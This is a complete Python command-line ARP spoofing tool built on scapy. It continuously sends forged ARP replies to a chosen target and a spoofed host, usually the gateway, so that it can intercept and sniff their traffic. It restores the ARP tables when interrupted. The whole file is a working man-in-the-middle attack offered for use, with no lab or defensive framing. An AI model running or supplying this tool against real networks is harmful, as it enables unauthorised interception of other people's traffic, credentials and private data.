#!/usr/bin/python

import scapy.all as scapy
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class ARPSpoofer:
    def __init__(self, target_ip, spoof_ip, interface):
        # Initalizes target ip, spoof ip, and network interface
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface

    def grab_mac(self, ip):
        # Send ARP request to grab MAC address of target IP
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answer = scapy.srp(final_packet, iface=self.interface, timeout =2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    def spoof_target(self, target, spoofed):
        # Spoofs target through acting as the spoofed IP address
        mac = self.grab_mac(target)
        packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.YELLOW + f"[+] Spoofing {target} pretending to be {spoofed}")

    def restore(self, dest_ip, source_ip):
        # Restores the ARP table of target machine to original state.
        dest_mac = self.grab_mac(dest_ip)
        source_mac = self.grab_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.GREEN + f"[+] Restoring {dest_ip} to original state.")

    def run(self):
        # Starts ARP spoofing attack through continueous sending of spoofed packets
        # Upon interruption ARP table is restored (Ctrl+C)
        try:
            while True:
                self.spoof_target(self.target_ip, self.spoof_ip) # Spoof IP of target
                self.spoof_target(self.spoof_ip, self.target_ip) # Spoofing the spoofed IP
        except KeyboardInterrupt:
            print(Fore.RED + "[!] Detected cancellation. Restoring APR tables... Please be patient")
            self.restore(self.target_ip, self.spoof_ip)
            self.restore(self.spoof_ip, self.target_ip)
            print(Fore.GREEN + "[+] ARP tables restored.")
            

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool to sniff network traffic.")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-s", "--spoof", required=True, help="Spoofed IP address (e.g. Gateway IP")
    parser.add_argument("-i", "--interface", required=True, help="Network Interface (e.g. eth0, wlan0)")

    # Parse arguments
    args = parser.parse_args()

    # Create ARP Spoofer object and start the spoofing process
    spoofer = ARPSpoofer(target_ip=args.target, spoof_ip=args.spoof, interface=args.interface)
    spoofer.run()



